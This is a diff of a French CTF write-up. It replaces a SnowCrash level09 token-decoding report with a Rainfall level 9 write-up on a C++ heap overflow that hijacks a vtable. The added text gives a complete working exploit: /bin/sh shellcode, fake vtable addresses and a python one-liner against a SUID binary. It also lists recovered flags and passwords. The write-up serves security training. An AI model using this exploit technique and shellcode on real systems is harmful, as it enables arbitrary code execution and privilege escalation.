@@ -1,119 +1,104 @@
-# Rapport CTF SnowCrash - Level09 (Version Améliorée)
+# Rainfall - Niveau 9
 
-## Contexte  
-**Objectif** : Exploiter le binaire `level09` (SUID) pour lire le fichier `token` protégé et obtenir le flag de `flag09`.  
-**Éléments fournis** :  
-- Binaire `level09` (exécuté avec les droits de `flag09`)  
-- Fichier `token` (contenu binaire non lisible directement)  
+## Objectif
 
----
+Exploiter une vulnérabilité de type heap overflow dans un programme C++ utilisant des objets et des tables virtuelles (vtable), afin d'exécuter du shellcode et obtenir le flag.
 
-## Reconnaissance Initiale  
+## Structure du Programme
 
-### Permissions et Fichiers  
+Le programme crée deux objets de classe `N` :
+
+```cpp
+N *obj1 = new N(5);
+N *obj2 = new N(6);
+```
+
+Structure en mémoire de chaque objet `N` :
+
+* Offset `0x00` : Pointeur vers la vtable (table des méthodes virtuelles)
+* Offset `0x04` : Buffer de données (104 bytes)
+* Offset `0x68` : Valeur entière (5 ou 6)
+
+## Vulnérabilité
+
+La fonction `N::setAnnotation()` utilise `memcpy()` sans vérifier la taille :
+
+```cpp
+void N::setAnnotation(N *this, char *param_1) {
+    size_t __n = strlen(param_1);
+    memcpy(this + 4, param_1, __n);
+}
+```
+
+Cette copie sans contrôle permet un heap overflow, écrasant des pointeurs adjacents (notamment la vtable).
+
+## Détail précis de la payload
+
+La payload exploitée est :
+
 ```bash
-level09@SnowCrash:~$ ls -la
--rwsr-sr-x 1 flag09  level09 7640 Mar  5  2016 level09  # SUID activé
-----r--r-- 1 flag09  level09   26 Mar  5  2016 token    # Lisible par level09
+"\x10\xa0\x04\x08" + shellcode + "A" * 76 + "\x0c\xa0\x04\x08"
 ```
 
-### Comportement du Binaire  
-Tests avec différentes entrées :  
+Décomposons précisément :
+
+* **"\x10\xa0\x04\x08"** : Première entrée de notre fausse vtable (adresse du début du shellcode dans le buffer).
+* **Shellcode (28 bytes)** : Lance un shell (`execve("/bin/sh", NULL, NULL)`).
+* **"A" \* 76** : Padding pour remplir le buffer jusqu’au pointeur vtable.
+* **"\x0c\xa0\x04\x08"** : Adresse de notre fausse vtable, écrasant le pointeur vtable original.
+
+## État précis de la mémoire après l'overflow
+
+* Objet 1 (`obj1`) :
+
+  * `0x0804a008`: \[Pointeur vtable original]
+  * `0x0804a00c`: \[0x0804a010] ← Position où on écrit la fausse vtable
+  * `0x0804a010`: \[Shellcode] ← Code malveillant
+  * `0x0804a02c`: \[AAAAA...] Padding
+
+* Objet 2 (`obj2`) :
+
+  * `0x0804a074`: \[0x0804a00c] ← Pointeur vtable écrasé, pointe vers fausse vtable
+  * `0x0804a078`: \[Buffer obj2]
+
+## Mécanisme détaillé de l'exploitation
+
+1. **Overflow du buffer** :
+
+   * La payload dépasse les 104 bytes du buffer.
+   * Écrase le pointeur vtable de `obj2` par `0x0804a00c` (notre fausse vtable).
+
+2. **Mécanisme vtable** :
+
+   * Lors d'un appel de méthode virtuelle (`call *%edx`), le programme lit le pointeur vtable (0x0804a00c), puis la première entrée (0x0804a010) et exécute le shellcode.
+
+## Pourquoi une fausse vtable ?
+
+* **Double indirection** :
+
+  * `this` → pointeur vtable (0x0804a00c) → entrée vtable (0x0804a010) → shellcode.
+
+Si le pointeur vtable pointait directement vers le shellcode, le programme lirait les premières instructions du shellcode comme une adresse, ce qui provoquerait un crash. En créant une fausse vtable, on contrôle parfaitement le flux d’exécution.
+
+## Pourquoi l’exploit fonctionne
+
+* Aucune protection moderne (ASLR, NX, stack canaries).
+* Heap exécutable permettant l'exécution directe du shellcode.
+* Contrôle complet du flux d’exécution via vtable falsifiée.
+* Privilèges élevés du binaire (bit SUID).
+
+## Exploit complet
+
 ```bash
-$ ./level09 "11111" → "12345"  
-$ ./level09 "abcde" → "acegi"  
+./level9 $(python -c 'print("\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08")')
 ```
 
-**Observation clé** : Chaque caractère de sortie = caractère d'entrée + position (index).  
-Exemple avec "abcde" (ASCII 97,98,99,100,101) :  
-- `a` (97) + 0 = 97 → `a`  
-- `b` (98) + 1 = 99 → `c`  
-- ... → Résultat : `acegi`  
+## Résultat final (flag)
 
----
-
-## Analyse du Fichier `token`  
-
-### Contenu Brut (Non Imprimable)  
-```bash
-$ cat token → f4kmm6p|=�p�n��DB�Du{��  
+```
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
 
-### Conversion Hexadécimale  
-```bash
-$ xxd -p token → 66346b6d6d36707c3d827f70826e838244428344757b7f8c890a  
-```
+## Conclusion
 
-**Pourquoi ?** Les caractères non imprimables (ex: `0x7f`, `0x82`) ne peuvent être affichés en ASCII standard. La conversion hexadécimale permet de traiter chaque octet individuellement.
-
----
-
-## Solution : Inversion de l'Algorithme  
-
-### Stratégie  
-Pour décoder `token`, il faut soustraire l'index de chaque octet :  
-`octet_décodé = octet_chiffré - position`  
-
-### Script Python (Version Corrigée)  
-```python
-hex_token = "66346b6d6d36707c3d827f70826e838244428344757b7f8c890a"
-token_bytes = bytes.fromhex(hex_token)
-
-decoded = []
-for i, byte in enumerate(token_bytes):
-    decoded_byte = byte - i
-    decoded.append(decoded_byte if 0 <= decoded_byte <= 255 else 0)  # Gestion des débordements
-
-password = bytes(decoded).decode('ascii', errors='ignore').strip()
-print("Mot de passe décodé:", password)  # Sortie : f3iji1ju5yuevaus41q1afiuq
-```
-
-**Échec initial** : Des valeurs négatives (ex: `0x0a - 25 = -15`) causaient une erreur `chr()`.  
-**Correction** : Remplacement des valeurs hors plage ASCII par `0` ou suppression.
-
----
-
-## Exploitation du Résultat  
-
-### Connexion à `flag09`  
-```bash
-$ su flag09  
-Password: f3iji1ju5yuevaus41q1afiuq  # Note : Le "?" final est un artefact et doit être ignoré
-```
-
-### Récupération du Flag  
-```bash
-$ getflag  
-Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z  
-```
-
----
-
-## Annexes Techniques  
-
-| Position | Octet (Hex) | Décodage (Hex - Index) | Caractère |
-|----------|-------------|------------------------|-----------|
-| 0        | 0x66        | 0x66 - 0 = 0x66 (102) | f         |
-| 1        | 0x34        | 0x34 - 1 = 0x33 (51)  | 3         |
-| 2        | 0x6b        | 0x6b - 2 = 0x69 (105) | i         |
-| ...      | ...         | ...                    | ...       |
-| 24       | 0x0a        | 0x0a - 24 = -14        | (ignoré)  |
-
----
-
-## Compétences Mobilisées  
-- **Reverse Engineering** : Déduction d'un algorithme par tests black-box.  
-- **Programmation** : Manipulation de bytes et gestion des erreurs en Python.  
-- **Sécurité Unix** : Exploitation d'un binaire SUID pour escalade de privilèges.  
-
----
-
-## Conclusion  
-Ce niveau illustre deux failles critiques :  
-1. **Sécurité par l'obscurité** : Un algorithme de chiffrement faible est facilement inversible.  
-2. **Gestion des permissions** : Le SUID permet d'accéder à des ressources protégées via un binaire vulnérable.  
-
-**Recommandations** :  
-- Utiliser des algorithmes de chiffrement robustes (ex: AES).  
-- Éviter les bits SUID sur des binaires traitant des données sensibles.  
-- Supprimer les fichiers temporaires contenant des secrets.  
+Ce niveau présente une exploitation très précise impliquant la manipulation d'une vtable C++, démontrant l’importance cruciale de contrôler les tailles lors de la gestion de la mémoire dynamique. L'exploitation réussie conduit à l’exécution de code arbitraire avec des privilèges élevés, révélant ainsi le flag.
